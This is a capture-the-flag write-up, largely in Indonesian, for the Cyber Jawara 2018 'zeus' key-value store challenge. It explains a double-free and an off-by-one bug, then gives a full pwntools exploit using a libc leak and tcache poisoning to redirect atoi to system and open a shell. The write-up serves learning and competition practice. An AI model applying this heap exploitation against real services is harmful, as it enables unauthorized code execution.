+++
title = "Cyber Jawara 2018 Final - zeus"
date = "2018-10-14 18:55:10"
categories = [
  "writeup",
  "pwn",
]

+++

## desc

> In-memory key-value database server like Redis and Memcache is widely used for caching in a production server. Can you pwn this key-value database service? You need to reverse engineered it first to know what data structure is used for storing the data. This service is also run with sandbox. For patching, you are only allowed to patch 32 bytes in 'zeus' binary and only 2 bytes in 'zeus_sandbox'. For this service, all attack points are multiplied by 2x.

> Downloads :
> [zeus](/assets/cj/zeus/zeus)
> [libc-2.28-9dc614ec33ee0284064ec5535bda431c.so](/assets/cj/zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so)
> [solve.py](/assets/cj/zeus/solve.py)

```
λ › ./zeus
...

(1) Insert
(2) Delete
(3) Lookup
(0) Exit

>> 1
Key length: 8
Insert key: AAAAAAAA
Value length: 8
Insert value: AAAAAAAA
8
[Key inserted] AAAAAAAA:AAAAAAAA

(1) Insert
(2) Delete
(3) Lookup
(0) Exit

>> 3
Key: AAAAAAAA
Value: AAAAAAAA^C

[*] '/Challs/cj/p11-zeus/zeus'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

[*] '/Challs/cj/p11-zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## intro

Problem heap dengan interface menu yang tidak terlalu asing (add-delete-view). libc yang dipakai adalah libc 2.28 dari ubuntu 18.10, dengan begitu fitur tcache ada di libc ini. Bisa diperiksa lagi juga,
```
λ › grep tcache libc-2.28-9dc614ec33ee0284064ec5535bda431c.so
Binary file libc-2.28-9dc614ec33ee0284064ec5535bda431c.so matches
```
tcache itu apa sih? tcache ini secara singkat bisa dibaca di sini [http://tukan.farm/2017/07/08/tcache/](http://tukan.farm/2017/07/08/tcache/), untuk yang belum paham glibc malloc dan internalnya, baca dulu [https://github.com/shellpish/how2heap](https://github.com/shellpish/how2heap)

## internals

Beberapa hal internal penting yang dipakai pada binary ini,
### safe-malloc (?)
_request_ size terbatas 0 - 0x400.
```C
uint_16t size;

if ( size && size <= 0x400u )
  {
    ptr = malloc(size);
    memset(ptr, 0, size);
    _ptr = ptr;
  }
```
### single linked-list data
data disimpan dengan model linked list
```C
struct _list
{
  uint_16t key_len;
  uint_16t value_len;
  char* key;
  char* value;
  _list* next;
};
```

## bug
### double-free
Pada `delete()`, jika list terakhir dihapus, pointer next terkahir (NULL) tidak diarahkan ke list sebelumnya, skema double-free dapat dilakukan hanya pada list terakhir.
```C
found = 0;
while ( ptr->next )
  {
    tmp = ptr;
    ptr = (linked_list *)ptr->next;
    if ( ptr->key && !strcmp(ptr->key, s) )
      {
        found = 1;
        if ( ptr->next )
          tmp->next = ptr->next; // BUG
        free(ptr);
        break;
      }
  }
```
### off-by-one null byte
`insert()` pada saat memasukkan nilai null-byte ke string.
```C
  printf("Key length: ");
  fgets(&s, 1024, stdin);
  _key_len = atoi(&s);
  _key = (char *)safe_malloc(_key_len);
  if ( _key )
  {
    printf("Insert key: ", 1024LL);
    fgets(_key, _key_len + 2, stdin);
    _key[_key_len] = 0; // BUG
    printf("Value length: ");
    fgets(&s, 1024, stdin);
    _value_len = atoi(&s);
    _value = (char *)safe_malloc(_value_len);
    if ( _value )
    {
      printf("Insert value: ", 1024LL);
      fgets(_value, _value_len + 2, stdin);
      _value[_value_len] = 0; // BUG
      v0 = strlen(_value);
      printf("%d\n", v0);
      found = 0;
      list = (linked_list *)p_list;
      while ( list->next )
      {
        list = (linked_list *)list->next;
        if ( list->key && !strcmp(list->key, _key) )
        {
          found = 1;
          if ( list->value_len < _value_len )
          {
            list->value = realloc(list->value, _value_len + 1);
            list->value_len = _value_len;
          }
          memcpy(list->value, _value, _value_len);
          printf("[Key modified] %s:%s\n", list->key, list->value);
          break;
        }
      }
      if ( !found )
      {
        tmp = (linked_list *)malloc(0x20uLL);
        tmp->key_len = _key_len;
        tmp->value_len = _value_len;
        tmp->key = _key;
        tmp->value = _value;
        tmp->next = 0LL;
        list->next = tmp;
        printf("[Key inserted] %s:%s\n", _key, _value);
      }
    }
```
off-by-one ini sebenernya gak terlalu berguna (??) karena jika mau diakitkan dengan exploit malloc dengan poison-null-byte, pointer untuk `free()` hanya pada linked list yang ukurannya tetap di 0x20, sedangkan poison-null-byte lebih mudah jika ukuran malloc 0x100++.

## exploit
buat mempermudah penulisan exploit,
```python
def insert(key, val):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', len(key).__str__())
    r.sendlineafter(': ', key)
    r.sendlineafter(': ', len(val).__str__())
    r.sendlineafter(': ', val)
    r.recvline(False)
    log.info(r.recvline(False))

def delete(key):
    r.sendlineafter('>> ', '2')
    r.sendlineafter(': ', key)
    log.info(r.recvline(False))

def lookup(key):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(': ', key)
    r.recvuntil(': ')
    return r.recvline(False)
```
### leak
libc leak dapat memanfaatkan double-free. `free()` hanya dilakukan ke struct list ukurannya 0x20 yang berarti masuk ke `fastbin[1] (0x30)`.
```python
insert('A' * 8, 'a' * 8)

# fastbin[0] (0x20) : AAAAAAAA -> aaaaaaaa
# fastbin[1] (0x30) : A
# tcache_entry[1] (0x30 freelist) :
# list : A

insert('B' * 8, 'b' * 8)

# fastbin[0] (0x20) : AAAAAAAA -> aaaaaaaa -> BBBBBBBB -> bbbbbbbb
# fastbin[1] (0x30) : A -> B
# tcache_entry[1] (0x30 freelist) :
# list : A -> B

delete('B' * 8)

# tcache_entry[1] (0x30 freelist) : B
# list : A -> B

delete('A' * 8)

# tcache_entry[1] (0x30 freelist) : B -> A
# list : B

delete('B' * 8)

# tcache_entry[1] (0x30 freelist) : B -> A -> B
# list : B

# gdb-peda$ heapinfo
# (0x20)     fastbin[0]: 0x0
# (0x30)     fastbin[1]: 0x0
# (0x40)     fastbin[2]: 0x0
# (0x50)     fastbin[3]: 0x0
# (0x60)     fastbin[4]: 0x0
# (0x70)     fastbin[5]: 0x0
# (0x80)     fastbin[6]: 0x0
# (0x90)     fastbin[7]: 0x0
# (0xa0)     fastbin[8]: 0x0
# (0xb0)     fastbin[9]: 0x0
#                   top: 0xbb8370 (size : 0x1fc90) 
#        last_remainder: 0x0 (size : 0x0) 
#             unsortbin: 0x0
# (0x30)   tcache_entry[1]: 0xbb8350 --> 0xbb82e0 --> 0xbb8350 (overlap chunk with 0xbb8340(freed) ) !!!
```
Seeb, udah punya 2 pointer yang sama di freelist. Lanjut, karena setiap _request_ list data baru selalu melakukan malloc(0x20), biar mencegah linked list jadi infinite loop, buat value/key ukurannya jatuh di fastbin\[1\] \(0x30\) yang berarti sekitar [0x19 - 0x28]. Dari sini bisa dimanfaatkan untuk membuat fake list yang meng _overwrite_ list B.
```python
# fake list di B
fake_list  = p64(0) # fd
fake_list += p64(0x00400505) # key : str.malloc
fake_list += p64(0x602020) # value : reloc.puts
fake_list += p64(0) # next

insert('A' * 8, fake_list)

# tcache_entry[1] (0x30 freelist) : B
# list : malloc -> B

puts = u64(lookup('malloc').ljust(8, '\x00'))
```
Loh, kok freelist jadi tinggal B? Sebelum `insert()` untuk key `'B' * 8`, `malloc()` untuk value lebih dulu dilakukan jadi list untuk `'B' * 8` ter- _overwrite_ oleh fake list. Intinya `'B' * 8` terhapus sehingga `malloc(0x20)` tetap dilakukan untuk key `'B' * 8` (ada dua kali `malloc(0x20)`). Untuk leak hanya perlu lookup value dari `malloc` karena sudah dibuat fake list dengan key `malloc` dan value ptr ke `reloc.puts` (got puts).

### tcache poisoning
tcache poisoning pada dasarnya hanya mengubah tcache_entry pada malloc\`d yang telah di free ke value yang diinginkan. Kondisi heap pada saat sebelum setelah di `free()`,

```python
delete('B' * 8)

# (0x30)   tcache_entry[1]: 0x1bab350
# 0x1bab290:      0x0000000000000000      0x0000000000000021
# 0x1bab2a0:      0x4141414141414141      0x0000000000000000
# 0x1bab2b0:      0x0000000000000000      0x0000000000000021
# 0x1bab2c0:      0x6161616161616161      0x0000000000000000
# 0x1bab2d0:      0x0000000000000000      0x0000000000000031
# 0x1bab2e0:      0x0000000800000008      0x0000000001bab2a0
# 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350
# 0x1bab300:      0x0000000000000000      0x0000000000000021
# 0x1bab310:      0x4242424242424242      0x0000000000000000
# 0x1bab320:      0x0000000000000000      0x0000000000000021
# 0x1bab330:      0x6262626262626262      0x0000000000000000
# 0x1bab340:      0x0000000000000000      0x0000000000000031
# 0x1bab350:      0x0000000000000000      0x0000000001bab310
# 0x1bab360:      0x0000000001bab330      0x0000000000000000
# 0x1bab370:      0x0000000000000000      0x000000000001fc91

delete('A' * 8)

# (0x30)   tcache_entry[1]: 0x1bab2e0 --> 0x1bab350
# 0x1bab290:      0x0000000000000000      0x0000000000000021
# 0x1bab2a0:      0x4141414141414141      0x0000000000000000
# 0x1bab2b0:      0x0000000000000000      0x0000000000000021
# 0x1bab2c0:      0x6161616161616161      0x0000000000000000
# 0x1bab2d0:      0x0000000000000000      0x0000000000000031
# 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0 
#                      ^----------------- tcache_entry
# 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350
# 0x1bab300:      0x0000000000000000      0x0000000000000021
# 0x1bab310:      0x4242424242424242      0x0000000000000000
# 0x1bab320:      0x0000000000000000      0x0000000000000021
# 0x1bab330:      0x6262626262626262      0x0000000000000000
# 0x1bab340:      0x0000000000000000      0x0000000000000031
# 0x1bab350:      0x0000000000000000      0x0000000001bab310
# 0x1bab360:      0x0000000001bab330      0x0000000000000000
# 0x1bab370:      0x0000000000000000      0x000000000001fc91

delete('B' * 8)
# (0x30)   tcache_entry[1]: 0x1bab350 --> 0x1bab2e0 --> 0x1bab350 (overlap chunk with 0x1bab340(freed) ) !!!
# 0x1bab290:      0x0000000000000000      0x0000000000000021
# 0x1bab2a0:      0x4141414141414141      0x0000000000000000
# 0x1bab2b0:      0x0000000000000000      0x0000000000000021
# 0x1bab2c0:      0x6161616161616161      0x0000000000000000
# 0x1bab2d0:      0x0000000000000000      0x0000000000000031
# 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0
#                      ^----------------- tcache_entry
# 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350
# 0x1bab300:      0x0000000000000000      0x0000000000000021
# 0x1bab310:      0x4242424242424242      0x0000000000000000
# 0x1bab320:      0x0000000000000000      0x0000000000000021
# 0x1bab330:      0x6262626262626262      0x0000000000000000
# 0x1bab340:      0x0000000000000000      0x0000000000000031
# 0x1bab350:      0x0000000001bab2e0      0x0000000001bab310
#                      ^----------------- tcache_entry
# 0x1bab360:      0x0000000001bab330      0x0000000000000000
# 0x1bab370:      0x0000000000000000      0x000000000001fc91
```
Dengan begitu payload sebelumnya untuk leak hanya perlu diubah sedikit untuk mengotrol tcache_entry ke got,

```python
fake_list = p64(0x602078) # tcache_entries -> got
fake_list += p64(0x00400505) # key : str.malloc
fake_list += p64(0x602020) # value : reloc.puts
fake_list += p64(0) # next

insert('A' * 8, fake_list)
```
tepat setelah beberapa kali malloc di fastbin[1], malloc akan return pointer di got.

## full-exploit
```python
#!/usr/bin/env python
from pwn import *
import sys, os

gdbcmd = 'b *0x004011ca'

context.terminal = 'kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c'.split()
# context.log_level = 'warn'


if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
    libc = ELF('./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so', checksec=False)
else:
    # r = process('/home/vagrant/ctf/cj/p11-zeus/zeus', aslr=False, env={'LD_PRELOAD':'./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so'})
    # r = process('/home/vagrant/ctf/cj/p11-zeus/zeus', aslr=False)
    r = process('/home/vagrant/ctf/cj/p11-zeus/zeus')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    gdb.attach(r, gdbcmd)

def insert(key, val):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', len(key).__str__())
    r.sendlineafter(': ', key)
    r.sendlineafter(': ', len(val).__str__())
    r.sendlineafter(': ', val)
    r.recvline(False)
    log.info(r.recvline(False))

def delete(key):
    r.sendlineafter('>> ', '2')
    r.sendlineafter(': ', key)
    log.info(r.recvline(False))

def lookup(key):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(': ', key)
    r.recvuntil(': ')
    return r.recvline(False)

insert('A' * 8, 'a' * 8)
insert('B' * 8, 'b' * 8)

delete('B' * 8)
delete('A' * 8)
delete('B' * 8)

fake_list = p64(0x602078) # tcache_entries -> got
fake_list += p64(0x00400505) # key : str.malloc
fake_list += p64(0x602020) # value : reloc.puts
fake_list += p64(0) # next

insert('A' * 8, fake_list)

puts = u64(lookup('malloc').ljust(8, '\x00'))
libc.address = puts - libc.symbols['puts']
log.info(hex(libc.address))

insert('B' * 8, 'b' * 8)

payload  = p64(libc.symbols['realloc']) # realloc
payload += p64(libc.symbols['setvbuf']) # setvbuf
payload += p64(libc.symbols['system']) # atoi -> system
payload += p64(libc.symbols['exit']) # exit

insert('B' * 8, payload)

r.sendlineafter('>> ', '1')
r.sendlineafter(': ','/bin/sh')

# r.sendline('cat /var/flag/*')
# print r.recvline(False)

r.interactive()
```

```sh
λ › python solve.py localhost 51100
[+] Opening connection to localhost on port 51100: Done
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /var/flag/*
CJ2018{flag}
$ 
[*] Closed connection to localhost port 51100
```

## rant
Soalnya cukup menarik, baru solve pas beberapa menit-menit setelah lomba selesai karena sempet kesasar dengan asumsi bisa pakai poison-null-byte (╯°. °）╯︵ ┻━┻. 11/10 would ikut again.
